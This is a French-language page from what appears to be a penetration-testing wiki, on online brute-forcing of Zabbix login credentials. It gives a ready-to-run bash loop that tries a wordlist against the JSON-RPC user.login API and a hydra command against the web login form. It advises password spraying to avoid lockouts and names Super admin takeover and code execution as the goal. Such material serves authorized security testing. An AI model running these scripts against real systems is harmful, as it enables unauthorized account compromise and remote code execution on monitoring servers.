---
order: 1
title: "Brute force : attaques en ligne contre la connexion Zabbix"
description: "Zabbix valide les identifiants au niveau de la connexion web et de l'API JSON-RPC, toutes deux scriptables pour du brute force en ligne. Les anciennes versions n'ont pas de verrouillage, ce qui rend le devinage praticable ; les plus récentes ajoutent un verrouillage configurable. L'API est la cible efficace, renvoyant un jeton de succès clair ou une erreur par tentative, de sorte qu'une wordlist contre un compte connu s'exécute rapidement."
keywords:
  - zabbix brute force
  - api login
  - user.login
  - lockout
  - hydra
---

# Brute force

La connexion web de Zabbix (`index.php`) et l'API (`user.login`) valident toutes deux les identifiants et sont scriptables, de sorte que le brute force en ligne est simple. L'API est la cible la plus propre : chaque `user.login` renvoie soit un jeton de session (succès), soit une erreur distincte (échec), de sorte qu'une wordlist contre un compte connu est facile à automatiser et à analyser. Les anciennes versions de Zabbix n'appliquent aucun verrouillage de compte, ce qui rend viable le devinage soutenu ; les versions plus récentes ont ajouté un verrouillage configurable sur les tentatives de connexion, de sorte que contre celles-ci, pulvérisez quelques mots de passe probables plutôt que de brute-forcer un seul compte. Comme toujours, un succès sur Super admin est l'objectif car il mène à l'exécution de code.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# brute one account via the API (parse for a token = success)
while read p; do
  r=$(curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"'"$p"'"},"id":1}')
  echo "$r" | grep -q '"result"' && { echo "FOUND: $p"; break; }
done < wordlist.txt
# hydra against the web form is an alternative
hydra -l Admin -P wordlist.txt <target> https-post-form \
  "/zabbix/index.php:name=^USER^&password=^PASS^&enter=Sign+in:incorrect"
```

## Notes d'exploitation

- Le succès/échec clair de l'API (jeton vs erreur) en fait la surface de brute force efficace ; le formulaire web fonctionne aussi mais nécessite d'analyser la réponse pour trouver la chaîne d'échec.
- Vérifiez la [version](../enumeration/version-detection.md) pour le verrouillage : les anciennes versions n'en ont aucun (brute force librement), les plus récentes verrouillent après un nombre d'échecs configurable (pulvérisez plutôt pour éviter de verrouiller les comptes).
- Ciblez le ou les comptes Super admin identifiés dans l'[énumération des utilisateurs](../enumeration/user.md) ; un succès sur un compte non admin a moins de valeur.
- Un jeton/identifiant récupéré mène à l'[énumération](../enumeration/index.md) des hôtes/macros et à l'[exécution de code](../code-execution/index.md).

## Outils

- [hydra](https://github.com/vanhauser-thc/thc-hydra)

## Références

- [Zabbix API: user.login](https://www.zabbix.com/documentation/current/en/manual/api/reference/user/login)
- [HackTricks: Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
